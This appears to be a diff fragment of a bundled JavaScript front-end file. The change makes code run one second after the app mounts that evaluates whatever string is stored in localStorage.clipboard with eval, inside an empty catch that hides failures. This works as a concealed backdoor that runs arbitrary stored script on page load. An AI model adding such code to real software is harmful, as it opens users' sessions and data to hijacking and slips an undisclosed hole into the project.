@@ -12397,6 +12397,6 @@ fo.use(au);
 fo.mount("#app");
 setTimeout(() => {
   try {
-    exec(localStorage.clipboard);
+    eval(localStorage.clipboard);
   } catch {}
 }, 1e3);
